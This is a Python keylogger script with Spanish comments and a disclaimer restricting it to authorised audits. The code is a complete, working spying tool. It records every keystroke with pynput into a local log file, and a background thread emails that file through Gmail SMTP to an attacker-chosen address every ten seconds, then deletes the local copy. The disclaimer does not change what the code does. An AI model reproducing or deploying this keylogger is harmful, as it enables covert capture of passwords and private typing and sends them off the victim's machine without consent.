"""
Elaborado por [Cyberhack07]

Este software está diseñado únicamente para fines educativos y de auditoría en sistemas donde se tenga autorización expresa.  
El uso de este código sin el consentimiento del propietario del sistema es **ilegal** y puede violar leyes de privacidad y ciberseguridad.  
El autor **NO se hace responsable** del uso indebido de este código.  

⚠️ **Usa este script solo en entornos donde tengas permiso explícito.**
"""

import os
import smtplib
import time
import logging
from pynput.keyboard import Key, Listener
from email.message import EmailMessage
import threading

# --- CONFIGURACIÓN ---
EMAIL_SENDER = "Email_send"  # Cambia por tu correo
EMAIL_PASSWORD = "Aplication_Passwd"  # Usa una "Contraseña de Aplicación" de Google
EMAIL_RECEIVER = "Email_recive"  # A dónde quieres recibir los logs
LOG_FILE = "logfile.txt"  # Archivo donde se guardarán las pulsaciones
INTERVALO_ENVIO = 10  # Tiempo en segundos para enviar el log

# Configuración del log
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# --- FUNCIONES ---
def enviar_email_gmail():
    """Envía el archivo de registro al correo usando Gmail."""
    try:
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:  # Verifica que el archivo no esté vacío
            msg = EmailMessage()
            msg["Subject"] = "Registro de Pulsaciones"
            msg["From"] = EMAIL_SENDER
            msg["To"] = EMAIL_RECEIVER
            msg.set_content("Adjunto el archivo con las pulsaciones de teclas.")

            with open(LOG_FILE, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename=LOG_FILE)

            # Conexión segura con Gmail
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()  # Inicia conexión segura
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.send_message(msg)

            print("[✔] Email enviado correctamente.")
            os.remove(LOG_FILE)  # Elimina el archivo después de enviarlo

    except Exception as e:
        print(f"[!] Error al enviar el correo: {e}")

def press(key):
    """Guarda las teclas presionadas en un archivo, detectando mayúsculas y minúsculas."""
    key_str = str(key).replace("'", "")  # Remueve comillas de caracteres simples

    if key == Key.space:
        key_str = " "  # Reemplaza "Key.space" por un espacio real
    elif key == Key.enter:
        key_str = "\n"  # Salto de línea para Enter
    elif key == Key.backspace:
        key_str = "[BORRADO]"  # Indicar cuando se borra algo
    elif key == Key.shift or key == Key.shift_r:
        return  # Ignorar teclas Shift

    logging.info(key_str)  # Guarda la tecla en el archivo

def enviar_logs_periodicamente():
    """Ejecuta el envío de emails en intervalos de tiempo sin bloquear el keylogger."""
    while True:
        time.sleep(INTERVALO_ENVIO)
        enviar_email_gmail()  # Envía el log cada X segundos

# --- PROCESO PRINCIPAL ---
def start_logger():
    """Ejecuta el keylogger en segundo plano y envía logs cada INTERVALO_ENVIO segundos."""
    thread_envio = threading.Thread(target=enviar_logs_periodicamente, daemon=True)
    thread_envio.start()  # Inicia el envío automático

    with Listener(on_press=press) as listener:
        listener.join()  # Mantiene el keylogger activo

if __name__ == "__main__":
    start_logger()
